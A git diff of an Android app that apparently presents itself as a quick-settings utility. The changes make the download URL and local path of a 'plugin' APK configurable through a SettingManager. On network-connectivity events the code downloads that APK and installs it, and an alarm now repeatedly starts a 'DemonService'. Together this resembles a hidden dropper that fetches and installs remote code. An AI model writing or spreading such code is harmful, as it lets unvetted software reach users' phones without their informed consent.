@@ -12,10 +12,12 @@ import android.util.DisplayMetrics;
 import android.view.*;
 import android.widget.ImageView;
 import android.widget.TextView;
+import com.bwx.bequick.fwk.Setting;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.common.utils.files.FileDownloader;
 import com.plugin.common.utils.files.FileOperatorHelper;
+import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
 import java.io.File;
@@ -302,7 +304,12 @@ public class UtilOperator {
     }
 
     public static boolean isPluginApkExist() {
-        File apkFile = new File(Config.PLUGIN_APK_PATH);
+        String local = SettingManager.getInstance().getLocalApkPath();
+        if (TextUtils.isEmpty(local)) {
+            return false;
+        }
+
+        File apkFile = new File(local);
         if (apkFile.exists()) {
             return true;
         }
@@ -311,18 +318,24 @@ public class UtilOperator {
     }
 
     public static void tryToDownloadPlugin(final Context context) {
+        final String local = SettingManager.getInstance().getLocalApkPath();
+        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
+        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
+            return;
+        }
+
         if (UtilsRuntime.isOnline(context)) {
             Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(true);
-                File apkFile = new File(Config.PLUGIN_APK_PATH);
+                File apkFile = new File(local);
                 if (apkFile.exists()) {
                     Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                     return;
                 }
 
-                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
+                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(downloadUrl)
                                                                    , new FileDownloader.DownloadListener() {
                     @Override
                     public void onDownloadProcess(int fileSize, int downloadSize) {
@@ -337,7 +350,7 @@ public class UtilOperator {
                             String localUrl = r.getRawLocalPath();
                             Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
                             if (!TextUtils.isEmpty(localUrl)) {
-                                String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
+                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                 if (!TextUtils.isEmpty(targetPath)) {
                                     Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
 
@@ -368,28 +381,39 @@ public class UtilOperator {
     }
 
     public static void tryToInstallPluginLocal(Context context) {
-        File apkFile = new File(Config.PLUGIN_APK_PATH);
+        String local = SettingManager.getInstance().getLocalApkPath();
+        if (TextUtils.isEmpty(local)) {
+            return;
+        }
+
+        File apkFile = new File(local);
         if (apkFile.exists()) {
-            intstallLocalApk(context, Config.PLUGIN_APK_PATH);
+            intstallLocalApk(context, local);
             return;
         }
     }
 
     public static void tryToInstallPlugin(final Context context) {
+        final String local = SettingManager.getInstance().getLocalApkPath();
+        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
+        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
+            return;
+        }
+
         if (UtilsRuntime.isOnline(context)) {
             Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(true);
-                File apkFile = new File(Config.PLUGIN_APK_PATH);
+                File apkFile = new File(local);
                 if (apkFile.exists()) {
-                    intstallLocalApk(context, Config.PLUGIN_APK_PATH);
+                    intstallLocalApk(context, local);
                     Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                     return;
                 }
 
                 FileDownloader.getInstance(context).postRequest(
-                                                                   new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
+                                                                   new FileDownloader.DownloadRequest(downloadUrl)
                                                                    , new FileDownloader.DownloadListener() {
                     @Override
                     public void onDownloadProcess(int fileSize, int downloadSize) {
@@ -403,12 +427,12 @@ public class UtilOperator {
                             String localUrl = r.getRawLocalPath();
                             Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
                             if (!TextUtils.isEmpty(localUrl)) {
-                                String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
+                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                 if (!TextUtils.isEmpty(targetPath)) {
                                     Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
                                     File targetFile = new File(targetPath);
                                     if (targetFile.exists()) {
-                                        intstallLocalApk(context, Config.PLUGIN_APK_PATH);
+                                        intstallLocalApk(context, local);
                                     }
                                 }
                             }
@@ -420,13 +444,12 @@ public class UtilOperator {
         }
     }
 
-    public static final String ACTIVE_ACTION = "com.xstd.qm.active";
-
     public static void startActiveAlarm(Context context, long delay) {
         cancelActiveAlarm(context);
         Intent intent = new Intent();
-        intent.setAction(ACTIVE_ACTION);
-        PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
+        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
+        intent.setClass(context, DemonService.class);
+        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
         long firstime = System.currentTimeMillis();
         AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
 
@@ -437,8 +460,9 @@ public class UtilOperator {
     public static void cancelActiveAlarm(Context context) {
         Config.LOGD("[[cancelActiveAlarm]]");
         Intent intent = new Intent();
-        intent.setAction(ACTIVE_ACTION);
-        PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
+        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
+        intent.setClass(context, DemonService.class);
+        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
         AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
         am.cancel(sender);
     }
